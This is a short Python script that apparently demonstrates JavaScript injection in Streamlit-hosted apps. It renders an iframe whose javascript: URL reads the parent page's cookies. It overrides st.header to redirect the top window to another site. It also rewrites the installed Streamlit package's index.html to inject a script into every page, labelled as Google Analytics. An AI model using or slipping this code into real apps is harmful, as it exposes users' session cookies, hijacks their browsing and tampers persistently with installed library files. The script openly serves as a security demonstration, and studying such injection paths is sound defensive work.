"""JS Injection in S4A apps, plz don't execute blindly.."""
import streamlit as st

st.markdown("""<iframe src="javascript:console.log(window.parent.document.cookie)"></iframe>""", unsafe_allow_html=True)

def test(*args, **kwargs):
    st.markdown("""<iframe src="javascript:window.top.location.href = 'https://facebook.com'"></iframe>""", unsafe_allow_html=True)
st.header = test

import os
import re

code = """<!-- Global site tag (gtag.js) - Google Analytics -->
<script>
  alert('hey there')
</script>"""
a=os.path.dirname(st.__file__)+'/static/index.html'
with open(a, 'r') as f:
    data=f.read()
    if len(re.findall('UA-', data))==0:
        with open(a, 'w') as ff:
            newdata=re.sub('<head>','<head>'+code,data)
            ff.write(newdata)